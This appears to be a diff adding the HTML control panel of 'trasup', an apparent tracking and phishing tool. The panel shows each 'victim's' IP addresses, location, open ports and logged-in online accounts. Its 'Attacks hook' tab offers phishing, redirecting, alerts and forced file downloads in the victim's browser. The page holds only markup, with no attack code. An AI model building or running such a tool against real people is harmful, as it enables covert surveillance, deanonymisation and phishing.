@@ -1,0 +1,274 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>trasup: Control Panel</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
+    <meta name="apple-mobile-web-app-title" content="trasup">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#3e396b" />
+    <meta name="google" value="notranslate"/>
+    <meta name="author" content="afeorma, @afeorma"/>
+    <meta name="description" content="Learn to track the world, to avoid being traced"/>
+
+    <!-- Styles & Favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="static/img/favicon.ico">
+    <link rel="shortcut icon" type="image/png" href="static/img/favicon.png">
+    <link rel="stylesheet" href="static/css/normalize.min.css">
+    <link rel="stylesheet" href="static/css/base-icons.css">
+    <link rel="stylesheet" href="static/css/services-icons.css">
+    <link rel="stylesheet" href="static/css/styles.css">
+    <!--[if (gte IE 6) & (lte IE 9)]>
+      <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script>
+      <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
+    <![endif]-->
+</head>
+
+<body class="trasupBody-Control">
+
+  <div class="trasupControl-Header">
+      <div class="trasupControl-Header--logo">
+        <div class="trasupControl-Header--logo---Box">
+          <span class="trasupControl-Header--logo---letter">t:</span>
+        </div>
+        <a href="/" class="trasupControl-Header--logoText">trasup <span class="trasupControl-Header--logo---description">People tracker on the Internet</span></a>
+      </div>
+
+      <div class="trasupControl-Header--menu">
+        <a class="trasupControl-Header--menu---btnLogout" href="/logout">
+          <div class="trasupControl-Header--menu---btnLogout----Icon icon-sign-out"></div>
+          <div class="trasupControl-Header--menu---btnLogout----Text">Logout</div>
+        </a>
+      </div>
+  </div>
+
+  <div class="trasupControl-Wrapper">
+      <div class="trasupControl-Wrapper--PrincipalData">
+
+        <div class="trasupControl-Wrapper--PrincipalData---Info">
+            <div class="trasupControl-Wrapper--PrincipalData---InfoDetails">
+              <h2><span class="trasupControl-Wrapper--PrincipalData---InfoDetails----Icons icon-text-document"></span> <span id="lbltrasup_DomainTitle"></span></h2>
+              <span class="trasupControl-Wrapper--PrincipalData---InfoDetails---domainClone"><span class="trasupControl-Wrapper--PrincipalData---InfoDetails----Icons icon-globe"></span> Domain clone: <a target="_blank" href="#" id="lnktrasupControl_DomainClone"></a></span>
+              <span class="trasupControl-Wrapper--PrincipalData---InfoDetails---start"><span class="trasupControl-Wrapper--PrincipalData---InfoDetails----Icons icon-clock-o"></span> Starting on <span id="lbltrasupControl_StartDate">{start date}</span></span>
+
+              <div class="trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy">
+                <a class="trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----url" id="lnktrasupControl_url" target='_blank' href="http://localhost">http://localhost</a> 
+                <button class="trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----button" title="Copy" onclick="copyUrl('#lnktrasupControl_url')"><span class="icon-clipboard2"></span></button>  
+                <button class="trasupControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare" title="Sharing in networks" data-action="toggle"><span class="icon-share"></span></button>  
+                <ul class="trasupControl-shareBox">
+                  <li class="trasupControl-shareBox--Item---triangleDown"></li>
+                  <li class="trasupControl-shareBox--Item---list">
+                    <a target="_self" id="lnktrasup_ShareTwitter" href="#"><span class="trasupControl-shareBox--socialTwitter"><i class="icon-twitter"></i></span> Twitter <span class="trasupControl-shareBox--pointRight"></span></a>
+                  </li>
+                  <li class="trasupControl-shareBox--Item---list">
+                    <a target="_self" id="lnktrasup_ShareFacebook" href="#"><span class="trasupControl-shareBox--socialFacebook"><i class="icon-facebook"></i></span> Facebook <span class="trasupControl-shareBox--pointRight"></span></a>
+                  </li>
+                </ul>
+              </div>
+
+          </div>
+        </div>
+        <!-- </info -->
+
+
+    </div>
+
+<div class="trasupControl-ViewDetails">
+    <div class="trasupControl-Preview">
+      <div class="trasupControl-Preview--box">
+        <div class="trasupControl-Preview--buttonClose"><i class="icon-times"></i></div>
+        <div class="trasupControl-Preview--box---Sidebar">
+          <div class="trasupControl-Preview--box---Sidebar----title">
+            <h2>Sessions connection</h2>
+          </div>
+
+          <div class="trasupControl-Preview--box---Sidebar----Networks">
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine facebook"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus online">Online</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine twitter"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine vkontakte"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine reddit"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine google-plus"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine tumblr"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine instagram"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine medium"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine github"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus online">Online</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine bitbucket"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus online">Online</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine dropbox"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus online">Online</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine spotify"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus online">Online</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine paypal"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine amazon"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine foursquare"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine airbnb"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine hackernews"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksDefine slack"><span class="trasupControl-Preview--box---Sidebar----NetworksStatus offline">Offline</span></div>
+            <div class="trasupControl-Preview--box---Sidebar----NetworksBehavior"><i class="icon-user2"></i> behavior: <span id="lbltrasupControl_Preview_Behavior"></span></div>
+          </div>
+        </div>
+
+        <div class="trasupControl-Preview--box---Mapbox">
+          <div class="trasupControl-Preview--box---MapboxDataIPs">
+              <span class="trasupControl-Preview--box---MapboxDataIPs----iconBox">
+                  <span class="icon-server"></span>
+              </span>
+              <span class="trasupControl-Preview--box---MapboxDataIPs----text">Public IP: <a class="trasupControl-Preview--box---MapboxDataIPs----link" href="#" id="lnktrasupControlPreview_PublicIP"></a></span>
+              <div class="trasupControl-Preview--box---MapboxDataIPs----line"></div>
+              <span class="trasupControl-Preview--box---MapboxDataIPs----text">Local IP: <span class="trasupControl-Preview--box---MapboxDataIPs----textLocal" id="lnktrasupControlPreview_LocalIP"></span></span>
+            </div>
+          <a id="lnktrasupControlPreview_Map" target="_blank" href="#"><img  id="imgtrasupControlPreview_Map" class="trasupControl-Preview--box---Mapbox----define" src="#"></a>
+        </div>
+      </div>
+
+      <div class="trasupControl-Preview--box">
+
+        <div class="trasupControl-Preview--box---Details">
+          <div class="trasupControl-Preview--box---DetailsLine">
+            <span class="trasupControl-Preview--box---DetailsLine----define"></span>
+            <div class="trasupControl-Preview--box---DetailsElement----Iconbox">
+              <span class="trasupControl-Preview--box---DetailsElement----Iconbox-----define">
+                  <span class="icon-sitemap"></span>
+              </span>
+              <span class="trasupControl-Preview--box---DetailsElement----text">General</span>
+            </div>
+             <!-- tabs -->
+            <div class="trasupControl-Preview--Tabs">
+              <button data-action="information" class="trasupControl-Preview--Tabs---button is-active" >Information</button>
+                <button data-action="attacksHook" class="trasupControl-Preview--Tabs---button">Attacks hook</button>
+            </div>
+
+          </div>
+        </div>
+
+
+        <div class="trasupControl-BoxTab" data-action="information">
+          <div class="trasupControl-Preview--dataShow">
+            <ul>
+              <div class="trasupControl-Preview--dataShow---define"><strong>CPU:</strong> <span id="lbltrasupControl_Preview_CPU">_</span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Operating System:</strong> <span id="lbltrasupControl_Preview_SO"></span></div>
+              <div class="trasupControl-Preview--dataShow---define" title=""><strong>User agent:</strong> <span id="lbltrasupControl_Preview_UA">_</span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Browser:</strong> <span id="lbltrasupControl_Preview_Browser"></span> <span id="lbltrasupControl_Preview_BrowserVersion"></span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Open Ports:</strong> <span id="lbltrasupControl_Preview_OpenPorts">_</span></div>
+            </ul>
+          </div>
+
+          <div class="trasupControl-Preview--dataShow">
+            <ul>
+              <div class="trasupControl-Preview--dataShow---define"><strong>ISP Name:</strong> <span id="lbltrasupControl_Preview_ISP">_</span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Country:</strong> <span id="lbltrasupControl_Preview_Country"></span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>City:</strong> <span id="lbltrasupControl_Preview_City"></span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Latitude:</strong> <span id="lbltrasupControl_Preview_Latitude"></span></div>
+              <div class="trasupControl-Preview--dataShow---define"><strong>Longitude:</strong> <span id="lbltrasupControl_Preview_Longitude"></span></div>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="trasupControl-BoxTab" data-action="attacksHook">
+        <h2 class="trasupControl-BoxTab--description">Here performs some controls in the browser of the victim</h2>
+        <div class="trasupControl-Preview--dataShow">
+          <form class="trasupControl-BoxTab--Form" action="?" method="post">
+            <input type="url" id="txttrasupControl-BoxTab-Phishing" autocomplete="on" class="trasupControl-BoxTab--Form---input" placeholder="Insert domain for phishing" name="phishing" required="true">
+            <button id="btntrasupControl-BoxTab-Phishing" class="trasupControl-BoxTab--Form---button" type="button">attack <span class="icon-angle-right"></span></button>
+          </form>
+
+          <form class="trasupControl-BoxTab--Form" action="?" method="post">
+            <input type="url" id="txttrasupControl-BoxTab-Redirect" autocomplete="on" class="trasupControl-BoxTab--Form---input" placeholder="Insert link to redirect" name="redirect" required="true">
+            <button id="btntrasupControl-BoxTab-Redirect" class="trasupControl-BoxTab--Form---button" type="button">redirect <span class="icon-angle-right"></span></button>
+          </form>
+        </div>
+
+        <div class="trasupControl-Preview--dataShow">
+          <form class="trasupControl-BoxTab--FormRight" action="?" method="post">
+            <input id="txttrasupControl-BoxTab-Alert" type="text" autocomplete="on" class="trasupControl-BoxTab--Form---input" placeholder="Create alert for victim" name="alert" required="true">
+            <button id="btntrasupControl-BoxTab-Alert" class="trasupControl-BoxTab--Form---button" type="button">execute <span class="icon-angle-right"></span></button>
+          </form>
+
+          <form class="trasupControl-BoxTab--FormRight" action="?" method="post">
+            <input id="txttrasupControl-BoxTab-Execute" type="text" autocomplete="on" class="trasupControl-BoxTab--Form---input" placeholder="Enter a file to download" name="download" required="true">
+            <button id="btntrasupControl-BoxTab-Execute" class="trasupControl-BoxTab--Form---button" type="button">Send <span class="icon-angle-right"></span></button>
+          </form>
+        </div>
+      </div>
+    </div> <!-- end(box) -->
+  </div> <!-- end/modal -->
+    <!-- end details -->
+
+
+    <div class="trasupControl-Wrapper--Stats">
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">Online</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Online">0</span>
+      </div>
+      <div class="trasupControl-Wrapper--Stats---lineSeparation"></div>
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">victims</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Victims">0</span>
+      </div>
+      
+      <div class="trasupControl-Wrapper--Stats---lineSeparation"></div>
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">clicks</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Clicks">0</span>
+      </div>
+      <div class="trasupControl-Wrapper--Stats---lineSeparation"></div>
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">sessions</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Sessions">0</span>
+      </div>
+      <div class="trasupControl-Wrapper--Stats---lineSeparation"></div>
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">requests</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Requests">0</span>
+      </div>
+      <div class="trasupControl-Wrapper--Stats---lineSeparation"></div>
+      <div class="trasupControl-Wrapper--Stats---Item">
+        <h2 class="trasupControl-Wrapper--Stats---Item----text">Locations</h2>
+        <span class="trasupControl-Wrapper--Stats---Item----number" id="lbltrasupControl_Stats_Locations"></span>
+      </div>
+    </div>
+
+    <!-- list requests & history -->
+    <div class="trasupControl-History">
+      <div class="trasupControl-History--Tabs">
+        <button data-action="logs" class="trasupControl-History--Tabs---button is-active"><span class="trasupControl-History--Tabs---button----iconLogs"></span>Logs Victims</button>
+        <button data-action="requests" class="trasupControl-History--Tabs---button"><span class="trasupControl-History--Tabs---button----iconRequests"></span>Request History</button>
+      </div>
+
+      <div class="trasupControl-History--line"></div>
+
+      <div id="cnttrasupControl_Logs" class="trasupControl-History--Logs" data-action="logs">
+
+      </div> 
+      <!-- </.Logs -->
+
+      <!-- requests -->
+      <div id="cnttrasupControl_Requests" class="trasupControl-History--Logs" data-action="requests">
+                 
+      </div>
+               <!-- end(requests)-->
+
+      <div class="trasupControl-Copyright">
+        <span class="trasupControl-Copyright--iconCode"></span> with <span class="trasupControl-Copyright--iconLove"></span> by <a class="trasupControl-Copyright--link" href="https://afeorma.com" title="afeorma: First Your Security"><img class="trasupControl-Copyright--logo" width="90" src="static/img/afeorma-logo.svg" alt="afeorma"></a>
+      </div>
+    </div><!-- </.Re -->
+    <!-- fin list -->
+
+  </div>
+</div>
+<!-- log -->
+
+<script src="static/js/libs.min.js"></script>
+<script src="static/js/trasup.js"></script>
+<script type="text/javascript">
+function copyUrl(id) {
+        var $temp = $("<input>");
+        $("body").append($temp);
+        $temp.val($(id).text()).select();
+        document.execCommand("copy");
+        $temp.remove();
+    }
+</script>
+</body>
+</html>
